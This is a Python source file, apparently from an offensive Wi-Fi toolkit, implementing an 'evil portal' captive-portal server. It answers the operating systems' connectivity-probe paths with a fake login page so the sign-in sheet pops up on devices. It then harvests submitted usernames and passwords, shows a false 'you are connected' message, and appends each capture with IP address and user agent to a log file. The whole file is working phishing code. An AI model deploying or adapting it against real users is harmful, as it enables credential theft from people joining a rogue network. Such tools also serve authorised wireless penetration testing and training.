"""Captive portal server: catch every request, harvest the login form.

This is the "evil portal" half of a Pineapple. It serves one page for *any*
path (so `/generate_204`, `/hotspot-detect.html` and `/connecttest.txt` all get
the form instead of the answer the OS expects, which is what makes the sheet
pop up on iOS/Android/Windows), answers the POST to ``/login`` with a "you're
connected" page, and appends every submission to a JSONL file.

Runs in a thread over ``ThreadingHTTPServer`` so the module keeps its grip on
hostapd/dnsmasq while it collects. No framework, no template engine.
"""

from __future__ import annotations

import json
import threading
import time
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from urllib.parse import parse_qs

from omni.wifi import rogue

__all__ = ["Captured", "Portal", "parse_fields"]

#: probes the OSes use to decide "there is a captive portal"
PROBE_PATHS = ("/generate_204", "/gen_204", "/hotspot-detect.html",
               "/library/test/success.html", "/connecttest.txt",
               "/ncsi.txt", "/canonical.html", "/success.txt")


def parse_fields(raw: bytes) -> dict[str, str]:
    """Decode a form body into {field: value}, keeping only interesting ones."""
    try:
        parsed = parse_qs(raw.decode("utf-8", "replace"), keep_blank_values=True)
    except (UnicodeDecodeError, ValueError):
        return {}
    flat = {k.lower(): v[0] for k, v in parsed.items() if v}
    user = next((flat[k] for k in rogue.USER_FIELDS if flat.get(k)), "")
    password = next((flat[k] for k in rogue.PASS_FIELDS if flat.get(k)), "")
    out = {"user": user, "pass": password}
    # keep the raw names too, so nothing unexpected is silently dropped
    for key, value in flat.items():
        out.setdefault(key, value)
    return out


class Captured:
    """One portal submission."""

    def __init__(self, address: str, agent: str, fields: dict[str, str]):
        self.address = address
        self.agent = agent
        self.fields = fields
        self.when = time.time()

    def as_dict(self) -> dict:
        return {"address": self.address, "agent": self.agent,
                "user": self.fields.get("user", ""),
                "pass": self.fields.get("pass", ""),
                "fields": self.fields, "when": self.when}

    def label(self) -> str:
        return (f"{self.address}  {self.fields.get('user') or '-'} : "
                f"{self.fields.get('pass') or '-'}")


class Portal:
    """A running captive portal."""

    def __init__(self, port: int = 80, title: str = "Wi-Fi",
                 note: str = "", log_path: str = ""):
        self.port = port
        self.title = title
        self.note = note
        self.log_path = log_path
        self.captured: list[Captured] = []
        self.hits: list[str] = []
        self._server: ThreadingHTTPServer | None = None
        self._thread: threading.Thread | None = None

    # -- lifecycle ---------------------------------------------------------
    def start(self) -> "Portal":
        portal = self

        class Handler(BaseHTTPRequestHandler):
            protocol_version = "HTTP/1.1"

            def log_message(self, *args) -> None:      # quiet by default
                return

            def _page(self, body: str, code: int = 200) -> None:
                blob = body.encode("utf-8")
                self.send_response(code)
                self.send_header("Content-Type", "text/html; charset=utf-8")
                self.send_header("Content-Length", str(len(blob)))
                self.send_header("Cache-Control", "no-store")
                self.end_headers()
                self.wfile.write(blob)

            def do_GET(self) -> None:                  # noqa: N802
                portal.hits.append(self.path)
                if self.path.startswith("/login"):
                    self._page(rogue.portal_page(portal.title,
                                                 "Signing you in…"))
                    return
                self._page(rogue.portal_page(portal.title, portal.note))

            def do_POST(self) -> None:                 # noqa: N802
                length = int(self.headers.get("Content-Length") or 0)
                raw = self.rfile.read(length) if length else b""
                fields = parse_fields(raw)
                entry = Captured(self.client_address[0],
                                 self.headers.get("User-Agent", ""), fields)
                portal._record(entry)
                self._page(rogue.portal_page(
                    portal.title, "You are connected. You may close this tab."))

        self._server = ThreadingHTTPServer(("0.0.0.0", self.port), Handler)
        self.port = self._server.server_address[1]     # port 0 -> real port
        self._thread = threading.Thread(target=self._server.serve_forever,
                                        name="omni-portal", daemon=True)
        self._thread.start()
        return self

    def stop(self) -> None:
        if self._server is not None:
            self._server.shutdown()
            self._server.server_close()
            self._server = None
        if self._thread is not None:
            self._thread.join(timeout=2.0)
            self._thread = None

    def __enter__(self) -> "Portal":
        return self.start()

    def __exit__(self, *exc) -> None:
        self.stop()

    # -- capture -----------------------------------------------------------
    def _record(self, entry: Captured) -> None:
        self.captured.append(entry)
        if not self.log_path:
            return
        try:
            with open(self.log_path, "a", encoding="utf-8",
                      newline="\n") as fh:
                fh.write(json.dumps(entry.as_dict()) + "\n")
        except OSError:
            pass

    def rows(self) -> list[list[str]]:
        return [[c.address, c.fields.get("user", "-"),
                 c.fields.get("pass", "-")] for c in self.captured]
